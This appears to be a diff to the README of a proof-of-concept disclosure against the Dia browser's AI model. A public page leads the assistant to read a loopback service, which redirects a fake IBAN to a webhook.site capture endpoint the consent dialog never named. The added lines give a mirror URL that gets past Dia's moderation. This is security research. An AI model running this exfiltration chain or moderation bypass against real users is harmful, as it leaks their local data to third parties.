@@ -14,12 +14,22 @@ printf 'TOTAL_DUE=1204.00 USD\nIBAN=GB11BCNY00000001234567\n' > api/invoices/447
 python3 srv.py            # 127.0.0.1:8002, no CORS headers; /r2 -> 302 to the capture URL
 ```
 
-Open <https://eternapeptix.github.io/dia-loopback-poc/> in Dia, open the assistant on that tab
-(⌘N → navigate → **File ▸ Chat…**), ask `what is the total due?`, and accept
-*“Dia would like to read the contents of http://127.0.0.1:8002/r2.”*
+Open a **public** copy of the page in Dia and ask the assistant about it:
+
+| public URL | notes |
+| --- | --- |
+| `./make-url.sh` (httpbin base64 mirror of `index-noscheme.html`) | works first try in 1.55.1 — use this for reproduction |
+| <https://eternapeptix.github.io/dia-loopback-poc/> | nicer to look at; Dia's moderation blocks it most of the time in 1.55.1 (retry) |
+
+Open the assistant on that tab (⌘N → navigate → **File ▸ Chat…**), ask `what is the total due?`,
+and accept *“Dia would like to read the contents of http://127.0.0.1:8002/r2.”*
 
 Expected: `GET /r2` in the local server log, then a `GET …/redir/GB11BCNY00000001234567` on the
 capture endpoint — the IBAN from the loopback service, on a host the consent dialog never named.
+
+The page can also be opened from `http://127.0.0.1:8000/` (serve this directory there) — a localhost
+origin works too; the point of the public URL is that the *page* is on a third-party origin while the
+data is on loopback.
 
 Capture endpoint: `https://webhook.site/e7f2e00d-391b-4e8e-ab1c-376d2c57cc6c` (inspect with its
 `/token/<id>/requests` API). Override with `HOOK=https://… python3 srv.py`.
